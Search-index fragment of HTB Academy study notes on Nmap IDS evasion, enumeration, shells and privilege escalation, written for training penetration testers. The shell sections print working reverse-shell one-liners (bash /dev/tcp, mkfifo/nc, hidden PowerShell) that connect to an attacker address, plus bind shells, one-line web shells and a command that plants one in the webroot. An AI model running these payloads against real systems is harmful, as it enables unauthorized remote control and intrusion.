<code>max-hostgroup</code> Dynamic, not affected by timing templates <code>min-rate</code> No minimum rate limit <code>max-rate</code> No maximum rate limit <code>defeat-rst-ratelimit</code> Not enabled by default"},{"location":"htb-academy/network_enumeration_with_nmap/#firewall-and-idsips-evasion","title":"Firewall and IDS/IPS Evasion","text":"<p>Nmap uses fragmentation of packets, the use of decoys, and others to evade IDS/IPS.</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#firewalls","title":"Firewalls","text":"<p>A firewall is a security measure against unauthorized connection  attempts from external networks. Every firewall security system is based on a software component that monitors network traffic between the  firewall and incoming data connections and decides how to handle the  connection based on the rules that have been set. It checks whether  individual network packets are being passed, ignored, or blocked. This  mechanism is designed to prevent unwanted connections that could be  potentially dangerous.</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#idsips","title":"IDS/IPS","text":"<p>Like the firewall, the intrusion detection system (<code>IDS</code>) and intrusion prevention system (<code>IPS</code>) are also software-based components. <code>IDS</code> scans the network for potential attacks, analyzes them, and reports any detected attacks. <code>IPS</code> complements <code>IDS</code> by taking specific defensive measures if a potential attack should have been detected. The analysis of such attacks is based on pattern  matching and signatures. If specific patterns are detected, such as a  service detection scan, <code>IPS</code> may prevent the pending connection attempts.</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#firewall-evasion","title":"Firewall evasion","text":"<p>If a firewall blocks our scans, we can try <code>ACK</code> or <code>Connected</code> scan (<code>-sA</code> and <code>-sT</code>). It's much harder for a firewall or IDS/IPS.</p>"},{"location":"htb-academy/network_enumeration_with_nmap/#scan-by-using-decoys","title":"Scan by Using Decoys","text":"<p>There are cases in which administrators block specific subnets from  different regions in principle. This prevents any access to the target  network. Another example is when IPS should block us. For this reason,  the Decoy scanning method (<code>-D</code>) is the right choice. With  this method, Nmap generates various random IP addresses inserted into  the IP header to disguise the origin of the packet sent. With this method, we can generate random (<code>RND</code>) a specific number (for example: <code>5</code>) of IP addresses separated by a colon (<code>:</code>). </p> <pre><code>Bonzo@htb[/htb]$ sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:14 CEST\nSENT (0.0378s) TCP 102.52.161.59:59289 &gt; 10.129.2.28:80 S ttl=42 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0378s) TCP 10.10.14.2:59289 &gt; 10.129.2.28:80 S ttl=59 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 210.120.38.29:59289 &gt; 10.129.2.28:80 S ttl=37 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 191.6.64.171:59289 &gt; 10.129.2.28:80 S ttl=38 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 184.178.194.209:59289 &gt; 10.129.2.28:80 S ttl=39 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nSENT (0.0379s) TCP 43.21.121.33:59289 &gt; 10.129.2.28:80 S ttl=55 id=29822 iplen=44  seq=3687542010 win=1024 &lt;mss 1460&gt;\nRCVD (0.1370s) TCP 10.129.2.28:80 &gt; 10.10.14.2:59289 SA ttl=64 id=0 iplen=44  seq=4056111701 win=64240 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up (0.099s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.15 seconds\n</code></pre>"},{"location":"htb-academy/network_enumeration_with_nmap/#scan-by-using-different-source-ip","title":"Scan by Using Different Source IP","text":"<p>We add the source IP with the option <code>-S</code></p> <pre><code>Bonzo@htb[/htb]$ sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 01:16 CEST\nNmap scan report for 10.129.2.28\nHost is up (0.010s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\n\nOS detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 4.11 seconds\n</code></pre>"},{"location":"htb-academy/network_enumeration_with_nmap/#dns-proxying","title":"DNS Proxying","text":"<p>We can use the DNS server port (53) to scan from this port. The reason to do that is that this port is often not blocked and we can do a scan on the internal network if the source port is port 53</p> <pre><code>Bonzo@htb[/htb]$ sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53\n\nSENT (0.0482s) TCP 10.10.14.2:53 &gt; 10.129.2.28:50000 S ttl=58 id=27470 iplen=44  seq=4003923435 win=1024 &lt;mss 1460&gt;\nRCVD (0.0608s) TCP 10.129.2.28:50000 &gt; 10.10.14.2:53 SA ttl=64 id=0 iplen=44  seq=540635485 win=64240 &lt;mss 1460&gt;\nNmap scan report for 10.129.2.28\nHost is up (0.013s latency).\n\nPORT      STATE SERVICE\n50000/tcp open  ibm-db2\nMAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n\nNmap done: 1 IP address (1 host up) scanned in 0.08 seconds\n</code></pre> <p>To figure out more about a service that is open if we scan from port 53, we have to connect to it. We can do that with <code>nc</code> and adding the <code>-p</code> option to define the source port</p> <pre><code>Bonzo@htb[/htb]$ ncat -nv -p 53 10.129.2.28 50000\n\nNcat: Version 7.80 ( https://nmap.org/ncat )\nNcat: Connected to 10.129.2.28:50000.\n220 ProFTPd\n</code></pre>"},{"location":"htb-academy/pentesting_basics/","title":"Pentesting Basics","text":""},{"location":"htb-academy/pentesting_basics/#information-security","title":"Information Security","text":"<p>The <code>CIA Triad</code> is the cornerstone of any  organization's security infrastructure; in fact, they (should) function  as goals and objectives for every security program.</p> <ul> <li>Confidentiality</li> </ul> <p>Protection of your most sensitive information from unauthorized access.</p> <ul> <li>Integrity</li> </ul> <p>Protection of data from modification or deletion by unauthorized parties,  and ensuring that when authorized people make changes that shouldn't  have been made the damage can be undone.</p> <ul> <li>Availability</li> </ul> <p>Systems, access channels, and authentication mechanisms must all be working properly for the information they provide and protect to be available when needed.</p> <p>In infosec, we usually hear the terms <code>red team</code> and <code>blue team</code>. In the simplest terms, the <code>red team</code> plays the attackers' role, while the <code>blue team</code> plays the defenders' part.</p>"},{"location":"htb-academy/pentesting_basics/#common-terms","title":"Common Terms","text":""},{"location":"htb-academy/pentesting_basics/#shell","title":"Shell","text":"<p>A shell  is a program that takes input from the user via the keyboard and passes  these commands to the operating system to perform a specific function.</p> <p>Most Linux systems use a program called Bash (Bourne Again Shell) as a shell program to interact with the operating system. </p> <p>Bash is an enhanced version of sh, the original unix shell.</p> <p>Aside from <code>bash</code> there are also other shells like Zsh, Tcsh, Ksh, Fish shell, etc.</p>"},{"location":"htb-academy/pentesting_basics/#port","title":"Port","text":"<p>Common Ports</p> <p>Well-Known Ports</p>"},{"location":"htb-academy/pentesting_basics/#web-server","title":"Web Server","text":"<p>A web server is an application that runs on the back-end server, which handles all of the <code>HTTP</code> traffic from the client-side browser, routes it to the requests  destination pages, and finally responds to the client-side browser. Web  servers usually run on TCP ports <code>80</code> or <code>443</code>,  and are responsible for connecting end-users to various parts of the web application, in addition to handling their various responses.</p>"},{"location":"htb-academy/pentesting_basics/#owasp-top-10","title":"OWASP TOP 10","text":"Number Category Description 1. Injection SQL injection, command injection, LDAP injection, etc. 2. Broken Authentication Authentication and session management misconfigurations can lead to  unauthorized access to an application through password guessing attacks  or improper session timeout, among other issues. 3. Sensitive Data Exposure Improperly protecting data such as financial, healthcare, or personally identifiable information. 4. XML External Entities (XXE) Poorly configured XML processors that can lead to internal file  disclosure, port scanning, remote code execution, or denial of service  attacks. 5. Broken Access Control Restrictions are not appropriately implemented to prevent users from accessing other users accounts, viewing sensitive data, accessing  unauthorized functionality, modifying data, etc. 6. Security Misconfiguration Insecure default configurations, open cloud storage, verbose error messages which disclose too much information. 7. Cross-Site Scripting (XSS) XSS occurs when an application does not properly sanitize  user-supplied input, allowing for the execution of HTML or JavaScript in a victim's browser. This can lead to session hijacking, website  defacement, redirecting a user to a malicious website, etc. 8. Insecure Deserialization This flaw often leads to remote code execution, injection attacks, or privilege escalation attacks. 9. Using Components with Known Vulnerabilities All of the components used by an application (libraries, frameworks, software modules) run with the same privilege as the application. If  the application uses components with known flaws, it may lead to  sensitive data exposure or remote code execution. 10. Insufficient Logging &amp; Monitoring Deficiencies in logging &amp; monitoring may allow a successful  attack to go unnoticed, for attackers to establish persistence in the  network, or tamper with or extract sensitive data without being noticed."},{"location":"htb-academy/pentesting_basics/#basic-tools","title":"Basic Tools","text":""},{"location":"htb-academy/pentesting_basics/#ssh","title":"ssh","text":"<p>Secure Shell (SSH) is a network protocol that runs on port <code>22</code> by default and provides users such as system administrators a secure  way to access a computer remotely. SSH can be configured with password  authentication or passwordless using public-key authentication using an SSH public/private key pair. </p>"},{"location":"htb-academy/pentesting_basics/#netcat","title":"netcat","text":"<p>Netcat, <code>ncat</code>, or <code>nc</code>, is a network utility for interacting with TCP/UDP ports. It  can be used for many things during a pentest. Its primary usage is for  connecting to shells.</p>"},{"location":"htb-academy/pentesting_basics/#socat","title":"socat","text":"<p><code>socat</code> has a few features that <code>netcat</code> does not support, like forwarding ports and connecting to serial devices. <code>Socat</code> can also be used to upgrade a shell to a fully interactive TTY.  A standalone binary of <code>Socat</code> can be transferred to a system after obtaining remote code execution to get a more stable reverse shell connection.</p>"},{"location":"htb-academy/pentesting_basics/#tmux","title":"tmux","text":"<p>tmux is an open-source terminal multiplexer for Unix-like  operating systems. It allows multiple terminal sessions to be accessed  simultaneously in a single window. It is useful for running more than  one command-line program at the same time.</p>"},{"location":"htb-academy/pentesting_basics/#vivim","title":"vi/vim","text":"<p>Vim is a text editor that can be used for writing code or editing  text files on Linux systems. One of the great benefits of using <code>Vim</code> is that it relies entirely on the keyboard nad that it's included on almost every linux system.</p>"},{"location":"htb-academy/pentesting_basics/#service-scanning","title":"Service Scanning","text":"<p>A service is an application running on a computer that performs some useful function for other users or computers.</p> <p>We scan for services with <code>nmap</code>. To scan for services we need an IP. There are several scans possible (TCP SYN/Connect()/ACK/Window/Maimon and other). Running as <code>root</code>, we usually use the defaul TCP SYN scan (<code>-sS</code>)</p> <p>A typical scan (results included) can look like this:</p> <pre><code>Bonzo@htb[/htb]$ nmap -sV -sC -p- 10.129.42.253\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:18 EST\nNmap scan report for 10.129.42.253\nHost is up (0.11s latency).\nNot shown: 65530 closed ports\nPORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.10.14.2\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: PHP 7.4.3 - phpinfo()\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-02-25T21:21:51\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 233.68 seconds\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#web-enumeration","title":"Web Enumeration","text":"<p>When performing service scanning, we will often run into web servers  running on ports 80 and 443. Webservers host web applications (sometimes more than 1) which often provide a considerable attack surface and a  very high-value target during a penetration test. Proper web enumeration is critical, especially when an organization is not exposing many  services or those services are appropriately patched.</p>"},{"location":"htb-academy/pentesting_basics/#gobuster","title":"gobuster","text":"<p>After discovering a web application, it is always worth checking to see  if we can uncover any hidden files or directories on the webserver that  are not intended for public access. We can use a tool such as ffuf or GoBuster to perform this directory enumeration. Sometimes we will find hidden  functionality or pages/directories exposing sensitive data that can be  leveraged to access the web application or even remote code execution on the web server itself.</p> <p>For a directory scan, whatever tool we use, we need a wordlist. A very popular collection of wordlist is Seclists. </p> <pre><code>Bonzo@htb[/htb]$ gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt\n\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.10.121/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/dirb/wordlists/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/12/11 21:47:25 Starting gobuster\n===============================================================\n/.hta (Status: 403)\n/.htpasswd (Status: 403)\n/.htaccess (Status: 403)\n/index.php (Status: 200)\n/server-status (Status: 403)\n/wordpress (Status: 301)\n===============================================================\n2020/12/11 21:47:46 Finished\n===============================================================\n</code></pre> <p>We can enumerate subdomains as well. We use the <code>dns</code> flag with gobuster. There has to be a dns resolver available and it has to be used the domain name</p> <pre><code>Bonzo@htb[/htb]$ gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt\n\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Domain:     inlanefreight.com\n[+] Threads:    10\n[+] Timeout:    1s\n[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt\n===============================================================\n2020/12/17 23:08:55 Starting gobuster\n===============================================================\nFound: blog.inlanefreight.com\nFound: customer.inlanefreight.com\nFound: my.inlanefreight.com\nFound: ns1.inlanefreight.com\nFound: ns2.inlanefreight.com\nFound: ns3.inlanefreight.com\n===============================================================\n2020/12/17 23:10:34 Finished\n===============================================================\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#additional-web-enumeration-methods","title":"Additional Web Enumeration Methods","text":""},{"location":"htb-academy/pentesting_basics/#banner-grabbing-web-server-headers","title":"Banner Grabbing / Web Server Headers","text":"<p>We can grab the banner with curl. Another tool is EyeWitness, which can be used to take screenshots of target web applications, fingerprint them, and identify possible default credentials.</p> <pre><code>Bonzo@htb[/htb]$ curl -IL https://www.inlanefreight.com\n\nHTTP/1.1 200 OK\nDate: Fri, 18 Dec 2020 22:24:05 GMT\nServer: Apache/2.4.29 (Ubuntu)\nLink: &lt;https://www.inlanefreight.com/index.php/wp-json/&gt;; rel=\"https://api.w.org/\"\nLink: &lt;https://www.inlanefreight.com/&gt;; rel=shortlink\nContent-Type: text/html; charset=UTF-8\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#whatweb","title":"Whatweb","text":"<p>We can extract the version of web servers, supporting frameworks, and applications using the command-line tool <code>whatweb</code>. This information can help us pinpoint the technologies in use and begin to search for potential vulnerabilities.</p> <pre><code>Bonzo@htb[/htb]$ whatweb 10.10.10.121\n\nhttp://10.10.10.121 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[license@php.net], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.121], Title[PHP 7.4.3 - phpinfo()]\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#check-ssl-certificate","title":"Check ssl certificate","text":"<p>SSL/TLS certificates can give us names, emails, subdomains. It's always good to check.</p>"},{"location":"htb-academy/pentesting_basics/#check-robotstxt","title":"Check robots.txt","text":"<p>t is common for websites to contain a <code>robots.txt</code> file,  whose purpose is to instruct search engine web crawlers such as  Googlebot which resources can and cannot be accessed for indexing. The <code>robots.txt</code> file can provide valuable information such as the location of private files and admin pages.</p>"},{"location":"htb-academy/pentesting_basics/#check-source-code","title":"Check Source Code","text":"<p>Source code can reveal forgotten credentials or notices in the comments the developer forgot. </p>"},{"location":"htb-academy/pentesting_basics/#public-exploits","title":"Public exploits","text":"<p>Once we identify the services running on ports identified from our <code>nmap</code> scan, the first step is to look if any of the applications/services  have any public exploits. Public exploits can be found for web  applications and other applications running on open ports, like <code>SSH</code> or <code>ftp</code>.</p> <p>We can use google to search for exploits by simply adding the service and version number followed by  the phrase exploit.</p> <p></p> <p>We can also utilize online exploit databases to search for vulnerabilities, like Exploit DB, Rapid7 DB, or Vulnerability Lab. </p> <p>Mostly we use <code>searchsploit</code></p> <pre><code>Bonzo@htb[/htb]$ searchsploit openssh 7.2\n\n----------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                               |  Path\n----------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nOpenSSH 2.3 &lt; 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py\nOpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py\nOpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py\nOpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py\nOpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py\nOpenSSH &lt; 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt\nOpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt\nOpenSSH &lt; 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py\nOpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt\n----------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#types-of-shells","title":"Types of Shells","text":"Shell Type Description <code>Reverse shell</code> Initiates a connection back to a \"listener\" on our attack box. <code>Bind shell</code> \"Binds\" to a specific port on the target host and waits for a connection from our attack box. <code>Web shell</code> Runs operating system commands via the web browser, typically not  interactive or semi-interactive. It can also be used to run single  commands (i.e., leveraging a file upload vulnerability and uploading a <code>PHP</code> script to run a single command. <p>Upgrading Simple Shells to Fully Interactive TTYs</p>"},{"location":"htb-academy/pentesting_basics/#reverse-shell","title":"Reverse shell","text":"<p>Once we identify a vulnerability on the remote host that allows remote code execution, we can start a <code>netcat</code> listener on our machine that listens on a specific port, say port <code>1234</code>. With this listener in place, we can execute a <code>reverse shell command</code> that connects the remote systems shell, i.e., <code>Bash</code> or <code>PowerShell</code> to our <code>netcat</code> listener, which gives us a reverse connection over the remote system.</p> <pre><code>Bonzo@htb[/htb]$ nc -lvnp 1234\n\nlistening on [any] 1234 ...\n</code></pre> Flag Description <code>-l</code> Listen mode, to wait for a connection to connect to us. <code>-v</code> Verbose mode, so that we know when we receive a connection. <code>-n</code> Disable DNS resolution and only connect from/to IPs, to speed up the connection. <code>-p 1234</code> Port number <code>netcat</code> is listening on, and the reverse connection should be sent to. <p>The command we execute depends on what operating system the compromised  host runs on, i.e., Linux or Windows, and what applications and commands we can access. The Payload All The Things page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.</p> <p>Examples for reverse shells (Linux and Windows)</p> <p><code>Code: bash</code></p> <pre><code>bash -c 'bash -i &gt;&amp; /dev/TCP/10.10.10.10/1234 0&gt;&amp;1'\n</code></pre> <p><code>Code: bash</code></p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f\n</code></pre> <p><code>Code: powershell</code></p> <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#bind-shell","title":"Bind Shell","text":"<p>Another type of shell is a <code>Bind Shell</code>. Unlike a <code>Reverse Shell</code> that connects to us, we will have to connect to it on the <code>targets'</code> listening port.</p> <p>Once again, we can utilize Payload All The Things to find a proper command to start our bind shell.</p> <p>The following are reliable commands we can use to start a bind shell:</p> <p>Code: bash</p> <pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp 1234 &gt;/tmp/f\n</code></pre> <p>Code: python</p> <pre><code>python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'\n</code></pre> <p>Code: powershell</p> <pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#upgrading-a-shell","title":"Upgrading a shell","text":"<pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\nCTRL Z\nstty raw -echo\nfg\n[ENTER]\n[ENTER]\n</code></pre> <p>We may notice that our shell does not cover the entire terminal. To fix  this, we need to figure out a few variables. We can open another  terminal window on our system, maximize the windows or use any size we  want, and then input the following commands to get our variables:    </p> <pre><code>Bonzo@htb[/htb]$ echo $TERM\n\nxterm-256color\n</code></pre> <pre><code>Bonzo@htb[/htb]$ stty size\n\n67 318\n</code></pre> <pre><code>www-data@remotehost$ export TERM=xterm-256color\n\nwww-data@remotehost$ stty rows 67 columns 318\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#web-shell","title":"Web Shell","text":"<p>The final type of shell we have is a <code>Web Shell</code>. A <code>Web Shell</code> is typically a web script, i.e., <code>PHP</code> or <code>ASPX</code>, that accepts our command through HTTP request parameters such as <code>GET</code> or <code>POST</code> request parameters, executes our command, and prints its output back on the web page.</p>"},{"location":"htb-academy/pentesting_basics/#writing-a-web-shell","title":"Writing a Web Shell","text":"<p>First of all, we need to write our web shell that would take our command through a <code>GET</code> request, execute it, and print its output back. A web shell script is  typically a one-liner that is very short and can be memorized easily.  The following are some common short web shell scripts for common web  languages:</p> <p>Code: php</p> <pre><code>&lt;?PHP system($_GET['cmd']);?&gt;\n</code></pre> <p>Code: jsp</p> <pre><code>&lt;% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %&gt;\n</code></pre> <p>Code: asp</p> <pre><code>&lt;% eval request(\"cmd\") %&gt;\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#uploading-a-web-shell","title":"Uploading a Web Shell","text":"<p>Once we have our web shell, we need to place our web shell script  into the remote host's web directory (webroot) to execute the script  through the web browser. This can be through a vulnerability in an  upload feature, which would allow us to write one of our shells to a  file, i.e. <code>shell.php</code> and upload it, and then access our uploaded file to execute commands.</p> <p>However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the  web. So, the first step is to identify where the webroot is. The  following are the default webroots for common web servers:</p> Web Server Default Webroot <code>Apache</code> /var/www/html/ <code>Nginx</code> /usr/local/nginx/html/ <code>IIS</code> c:\\inetpub\\wwwroot\\ <code>XAMPP</code> C:\\xampp\\htdocs\\ <p>We can check these directories to see which webroot is in use and then use <code>echo</code> to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a <code>PHP</code> shell with the following command:</p> <p>Code: bash</p> <pre><code>echo \"&lt;?PHP system(\\$_GET['cmd']);?&gt;\" &gt; /var/www/html/shell.php\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#accessing-web-shell","title":"Accessing Web Shell","text":"<p>Once we write our web shell, we can either access it through a browser or by using <code>cURL</code>. We can visit the <code>shell.php</code> page on the compromised website, and use <code>?cmd=id</code> to execute the <code>id</code> command.</p> <p>Or using <code>curl</code>:</p> <pre><code>Bonzo@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id\n\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> <p>As we can see, we can keep changing the command to get its output. A  great benefit of a web shell is that it would bypass any firewall  restriction in place, as it will not open a new connection on a port but run on the web port on <code>80</code> or <code>443</code>, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place,  and we can access it and get command execution without exploiting the  remote host again.</p> <p>On the other hand, a web shell is not as interactive as reverse and  bind shells are since we have to keep requesting a different URL to  execute our commands. </p>"},{"location":"htb-academy/pentesting_basics/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"htb-academy/pentesting_basics/#privesc-checklists","title":"PrivEsc Checklists","text":"<p>Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets  online that have a collection of checks we can run and the commands to  run these checks. One excellent resource is HackTricks, which has an excellent checklist for both Linux and Windows local privilege escalation. Another excellent repository is PayloadsAllTheThings, which also has checklists for both Linux and Windows. We must start experimenting with various commands and techniques and  get familiar with them to understand multiple weaknesses that can lead  to escalating our privileges.</p> <p>Another useful tool we may use for server enumeration is the Privilege Escalation Awesome Scripts SUITE (PEASS), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.</p>"},{"location":"htb-academy/pentesting_basics/#enumeration-scripts","title":"Enumeration Scripts","text":"<p>Some of the common Linux enumeration scripts include LinEnum and linuxprivchecker, and for Windows include Seatbelt and JAWS. Another useful tool we may use for server enumeration is the Privilege Escalation Awesome Scripts SUITE (PEASS), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.</p> <pre><code>Bonzo@htb[/htb]$ ./linpeas.sh\n...SNIP...\n\nLinux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist\n LEYEND:\n  RED/YELLOW: 99% a PE vector\n  RED: You must take a look at it\n  LightCyan: Users with console\n  Blue: Users without console &amp; mounted devs\n  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)\n  LightMangenta: Your username\n\n\n====================================( Basic information )=====================================\nOS: Linux version 3.9.0-73-generic\nUser &amp; Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n...SNIP...\n</code></pre>"},{"location":"htb-academy/pentesting_basics/#kernel-exploits","title":"Kernel Exploits","text":"<p>Look for vulnerable kernels. For example, the above script showed us the Linux version to be <code>3.9.0-73-generic</code>. If we Google exploits for this version or use <code>searchsploit</code>, we would find a <code>CVE-2016-5195</code>, otherwise known as <code>DirtyCow</code>. We can search for and download the DirtyCow exploit and run it on the server to gain root access.</p>"},{"location":"htb-academy/pentesting_basics/#vulnerable-software","title":"Vulnerable Software","text":"<p>Another thing we should look for is installed software. For example, we can use the <code>dpkg -l</code> command on Linux or look at <code>C:\\Program Files</code> in Windows to see what software is installed on the system. We should  look for public exploits for any installed software, especially if any  older versions are in use, containing unpatched vulnerabilities.</p>"},{"location":"htb-academy/pentesting_basics/#user-privileges","title":"User privileges","text":"<p>An user with lower privileges can sometimes run scripts or programs with higher privileges. Therefore we should look at:</p> <ol> <li>Sudo</li> <li>SUID</li> <li>Windows Token Privileges</li> </ol> <pre><code>Bonzo@htb[/htb]$ sudo -l\n\n[sudo] password for user1:\n...SNIP...\n\nUser user1 may run the following commands on ExampleServer:\n    (ALL : ALL) ALL\n</code></pre> <p>The above output says that we can run all commands with <code>sudo</code>, which gives us complete access, and we can use the <code>su</code> command with <code>sudo</code> to switch to the root user:</p> <p>\u200b                                    </p> <pre><code>Bonzo@htb[/htb]$ sudo su -\n</code></pre> 